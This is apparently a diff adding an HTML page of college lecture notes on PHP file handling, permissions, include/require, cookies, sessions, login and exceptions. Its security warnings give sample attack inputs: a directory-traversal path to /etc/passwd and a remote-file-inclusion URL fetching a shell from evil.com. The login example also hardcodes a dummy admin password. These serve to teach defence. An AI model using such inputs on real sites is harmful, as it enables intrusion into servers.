@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Unit 5: File Handling, Sessions, and Error Handling – Internet Technology II</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      line-height: 1.7;
+      background-color: #f8f9fa;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+    h1 {
+      text-align: center;
+      color: #2c3e50;
+      font-size: 22pt;
+      margin-bottom: 30px;
+    }
+    h2 {
+      color: #34495e;
+      border-bottom: 3px solid #3498db;
+      padding-bottom: 8px;
+      margin-top: 40px;
+    }
+    h3 {
+      color: #2980b9;
+      margin-top: 25px;
+    }
+    .section {
+      background: white;
+      padding: 25px;
+      margin-bottom: 35px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      text-align: justify;
+    }
+    pre {
+      background-color: #000000;
+      color: #00ff41;
+      padding: 16px;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-size: 13pt;
+      margin: 15px 0;
+      line-height: 1.6;
+    }
+    code {
+      font-family: Consolas, monospace;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 20px 0;
+      display: block;
+      overflow-x: auto;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 12px;
+      text-align: left;
+    }
+    th {
+      background-color: #3498db;
+      color: white;
+    }
+    .note {
+      background-color: #e8f5ff;
+      border-left: 5px solid #3498db;
+      padding: 15px;
+      margin: 20px 0;
+      border-radius: 6px;
+    }
+    .tip {
+      background-color: #e8fff5;
+      border-left: 5px solid #27ae60;
+      padding: 15px;
+      margin: 20px 0;
+      border-radius: 6px;
+    }
+    .warning {
+      background-color: #fff3cd;
+      border-left: 5px solid #e67e22;
+      padding: 15px;
+      margin: 20px 0;
+      border-radius: 6px;
+    }
+    .example-output {
+      background: #f0f8ff;
+      padding: 12px;
+      border-left: 5px solid #1e90ff;
+      margin: 15px 0;
+      font-family: monospace;
+    }
+    @media (max-width: 768px) {
+      body { font-size: 15px; }
+      h1 { font-size: 1.6rem; margin-bottom: 24px; }
+      h2 { font-size: 1.3rem; }
+      .section { padding: 20px; margin-bottom: 28px; }
+    }
+    @media (max-width: 480px) {
+      body { font-size: 14px; }
+      h1 { font-size: 1.4rem; margin-bottom: 20px; }
+      h2 { font-size: 1.1rem; }
+      .section { padding: 16px; margin-bottom: 22px; }
+      pre { font-size: 12pt; }
+    }
+  </style>
+</head>
+<body>
+  <h1><b>Unit 5: File Handling, Sessions, and Error Handling</b></h1>
+
+  <div class="section">
+    <h2><b>5.1 Reading from and Writing to Files</b></h2>
+
+    <p>PHP provides several functions to work with files on the server. Always check file permissions and path carefully.</p>
+
+    <h3>Common File Modes</h3>
+    <table>
+      <tr><th>Mode</th><th>Description</th><th>Creates file if not exist?</th><th>Pointer position</th></tr>
+      <tr><td>r</td><td>Read only</td><td>No</td><td>Beginning</td></tr>
+      <tr><td>r+</td><td>Read & write</td><td>No</td><td>Beginning</td></tr>
+      <tr><td>w</td><td>Write only (truncates file)</td><td>Yes</td><td>Beginning</td></tr>
+      <tr><td>w+</td><td>Read & write (truncates)</td><td>Yes</td><td>Beginning</td></tr>
+      <tr><td>a</td><td>Write only (append)</td><td>Yes</td><td>End</td></tr>
+      <tr><td>a+</td><td>Read & write (append)</td><td>Yes</td><td>End for write</td></tr>
+    </table>
+
+    <pre><code>&lt;?php
+// Writing to file
+$file = fopen("data.txt", "w") or die("Unable to open file!");
+fwrite($file, "Hello Nepal!\n");
+fwrite($file, "This is line 2.\n");
+fclose($file);
+
+// Reading file
+$file = fopen("data.txt", "r") or die("Cannot open file!");
+while (!feof($file)) {
+    echo fgets($file) . "<br>";
+}
+fclose($file);
+
+// One-liner alternatives
+file_put_contents("log.txt", "Error occurred at " . date("Y-m-d H:i:s") . "\n", FILE_APPEND);
+$content = file_get_contents("data.txt");
+echo nl2br($content);
+?&gt;</code></pre>
+
+    <div class="warning">
+      <b>Security note:</b> Never allow user input to directly control file paths (directory traversal attack: ../../etc/passwd)
+    </div>
+  </div>
+
+  <div class="section">
+    <h2><b>5.2 Understanding File Permissions and Security Considerations</b></h2>
+
+    <h3>File Permissions (Linux/Unix style – important for hosting)</h3>
+    <table>
+      <tr><th>Permission</th><th>Value</th><th>Meaning</th><th>Recommended for PHP files</th></tr>
+      <tr><td>Read</td><td>r (4)</td><td>Can read file</td><td>—</td></tr>
+      <tr><td>Write</td><td>w (2)</td><td>Can modify file</td><td>—</td></tr>
+      <tr><td>Execute</td><td>x (1)</td><td>Can execute (scripts)</td><td>—</td></tr>
+      <tr><td>644</td><td>rw-r--r--</td><td>Owner read/write, others read</td><td>PHP files (.php)</td></tr>
+      <tr><td>755</td><td>rwxr-xr-x</td><td>Owner all, others read/execute</td><td>Folders, executable scripts</td></tr>
+      <tr><td>666</td><td>rw-rw-rw-</td><td>Everyone read/write</td><td>Dangerous – avoid!</td></tr>
+      <tr><td>777</td><td>rwxrwxrwx</td><td>Everyone full access</td><td>Never use on production!</td></tr>
+    </table>
+
+    <h3>Security Best Practices for File Handling</h3>
+    <ul>
+      <li>Never let user input control file path directly</li>
+      <li>Use <code>basename()</code> to strip directory info from uploaded filenames</li>
+      <li>Store sensitive files outside web root (e.g., /var/private/ not /htdocs/)</li>
+      <li>Check file type & size before processing</li>
+      <li>Disable dangerous PHP functions (<code>disable_functions</code> in php.ini)</li>
+      <li>Use <code>open_basedir</code> to restrict file access</li>
+      <li>Log file operations for auditing</li>
+    </ul>
+
+    <div class="warning">
+      <b>777 on uploads folder is very common mistake in student projects → easy to exploit.</b>
+    </div>
+  </div>
+
+  <div class="section">
+    <h2><b>5.3 File Inclusion (Include and Require)</b></h2>
+
+    <pre><code>// header.php
+&lt;h1&gt;My Website&lt;/h1&gt;
+&lt;nav&gt;&lt;a href="index.php"&gt;Home&lt;/a&gt; | &lt;a href="about.php"&gt;About&lt;/a&gt;&lt;/nav&gt;
+
+// footer.php
+&lt;footer&gt;
+    &lt;p&gt;&amp;copy; <?php echo date("Y"); ?> College Portal&lt;/p&gt;
+&lt;/footer&gt;
+
+// index.php
+&lt;?php include 'header.php'; ?&gt;
+
+&lt;h2&gt;Welcome to Home&lt;/h2&gt;
+
+&lt;?php require 'footer.php'; ?&gt;</code></pre>
+
+    <table>
+      <tr><th>Statement</th><th>Behavior on Failure</th><th>Use Case</th></tr>
+      <tr><td>include</td><td>Warning + continue execution</td><td>Non-critical parts (header, sidebar)</td></tr>
+      <tr><td>include_once</td><td>Include only once</td><td>Configuration files, classes</td></tr>
+      <tr><td>require</td><td>Fatal error + stop execution</td><td>Critical files (database config)</td></tr>
+      <tr><td>require_once</td><td>Fatal error if already included</td><td>Autoloaders, single-instance classes</td></tr>
+    </table>
+
+    <div class="warning">
+      <b>Remote File Inclusion (RFI) attack:</b> Never allow user input in include/require path<br>
+      e.g. ?page=http://evil.com/shell.txt → disable <code>allow_url_include = Off</code> in php.ini
+    </div>
+  </div>
+
+  <div class="section">
+    <h2><b>5.4 Managing Sessions and Cookies</b></h2>
+
+    <h3>Cookies (client-side)</h3>
+    <pre><code>// Set cookie (expires in 30 days)
+setcookie("username", "ram_sharma", time() + (86400 * 30), "/");
+
+// Read cookie
+if (isset($_COOKIE["username"])) {
+    echo "Welcome " . $_COOKIE["username"];
+}
+
+// Delete cookie
+setcookie("username", "", time() - 3600, "/");
+    </code></pre>
+
+    <h3>Sessions (server-side)</h3>
+    <pre><code>&lt;?php
+session_start();   // must be before any output
+
+// Set session variable
+$_SESSION["user_id"] = 101;
+$_SESSION["role"] = "student";
+
+// Read
+echo "User ID: " . $_SESSION["user_id"];
+
+// Unset one variable
+unset($_SESSION["role"]);
+
+// Destroy entire session
+session_destroy();
+?&gt;</code></pre>
+
+    <div class="tip">
+      <b>Cookie vs Session:</b><br>
+      • Cookie: stored in browser, can be tampered, size limit ~4KB<br>
+      • Session: stored on server, more secure, only session ID in cookie
+    </div>
+  </div>
+
+  <div class="section">
+    <h2><b>5.5 Implementing Session-based Authentication and Authorization</b></h2>
+
+    <pre><code>// login.php
+session_start();
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    // Dummy check (in real: use database + password_hash/verify)
+    if ($username === "admin" && $password === "123456") {
+        $_SESSION["loggedin"] = true;
+        $_SESSION["username"] = $username;
+        $_SESSION["role"] = "admin";
+        header("Location: dashboard.php");
+        exit;
+    } else {
+        $error = "Invalid credentials";
+    }
+}
+?&gt;
+
+&lt;form method="post"&gt;
+    Username: &lt;input type="text" name="username"&gt;&lt;br&gt;
+    Password: &lt;input type="password" name="password"&gt;&lt;br&gt;
+    &lt;button type="submit"&gt;Login&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+
+    <pre><code>// dashboard.php (protected page)
+session_start();
+
+if (!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true) {
+    header("Location: login.php");
+    exit;
+}
+
+echo "Welcome, " . htmlspecialchars($_SESSION["username"]) . "!<br>";
+if ($_SESSION["role"] === "admin") {
+    echo "Admin Panel: &lt;a href='manage_users.php'&gt;Manage Users&lt;/a&gt;";
+}
+    </code></pre>
+
+    <div class="warning">
+      <b>Security checklist:</b><br>
+      • Use HTTPS<br>
+      • Use <code>session_regenerate_id(true)</code> after login<br>
+      • Store hashed passwords (password_hash())<br>
+      • Use prepared statements for DB login<br>
+      • Add logout: <code>session_destroy()</code> + unset cookies
+    </div>
+  </div>
+
+  <div class="section">
+    <h2><b>5.6 Error Handling in PHP: try-catch blocks, exception handling</b></h2>
+
+    <h3>Basic Error Reporting Control</h3>
+    <pre><code>// development
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// production
+ini_set('display_errors', 0);
+error_reporting(E_ALL);  // still log errors
+    </code></pre>
+
+    <h3>try-catch with Exceptions</h3>
+    <pre><code>&lt;?php
+function divide($a, $b) {
+    if ($b == 0) {
+        throw new Exception("Division by zero!");
+    }
+    return $a / $b;
+}
+
+try {
+    echo divide(10, 0);
+} catch (Exception $e) {
+    echo "Error: " . $e->getMessage();
+} finally {
+    echo "&lt;br&gt;Operation attempted.";
+}
+?&gt;</code></pre>
+
+    <h3>Custom Exception</h3>
+    <pre><code>class ValidationException extends Exception {}
+
+function validateAge($age) {
+    if ($age < 18) {
+        throw new ValidationException("Age must be 18 or older!");
+    }
+}
+
+try {
+    validateAge(16);
+} catch (ValidationException $e) {
+    echo "Validation failed: " . $e->getMessage();
+} catch (Exception $e) {
+    echo "General error: " . $e->getMessage();
+}
+    </code></pre>
+
+    <div class="tip">
+      <b>Best practice in 2025:</b><br>
+      • Use exceptions for exceptional cases (not normal flow control)<br>
+      • Log errors (error_log() or Monolog)<br>
+      • Use set_error_handler() for custom error handling<br>
+      • In frameworks (Laravel) → global exception handling is built-in
+    </div>
+  </div>
+</body>
+</html>
